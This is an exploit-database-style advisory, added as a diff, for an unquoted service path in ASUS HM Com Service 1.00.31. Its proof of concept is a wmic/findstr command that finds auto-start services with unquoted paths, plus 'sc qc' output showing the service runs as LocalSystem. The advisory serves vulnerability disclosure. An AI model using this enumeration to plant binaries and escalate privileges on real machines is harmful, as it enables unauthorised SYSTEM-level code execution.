@@ -1,0 +1,31 @@
+# Exploit Title: ASUS HM Com Service 1.00.31 - 'asHMComSvc' Unquoted Service Path
+# Date: 2019-11-16
+# Exploit Author : Olimpia Saucedo
+# Vendor Homepage: www.asus.com
+# Version:  1.00.31
+# Tested on: Windows 10 Pro x64  (but it should works on all windows version)
+ 
+The application suffers from an unquoted service path issue impacting the service 'ASUS HM Com Service (aaHMSvc.exe)' related to the Asus Motherboard Utilities.
+This could potentially allow an authorized but non-privileged local user to execute arbitrary code with system privileges.
+ 
+POC:
+
+>wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
+
+ASUS HM Com Service      asHmComSvc
+C:\Program Files (x86)\ASUS\AAHM\1.00.31\aaHMSvc.exe
+Auto
+
+>sc qc "asHMComSvc"
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: asHMComSvc
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Program Files (x86)\ASUS\AAHM\1.00.31\aaHMSvc.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : ASUS HM Com Service
+        DEPENDENCIES       : RpcSs
+        SERVICE_START_NAME : LocalSystem
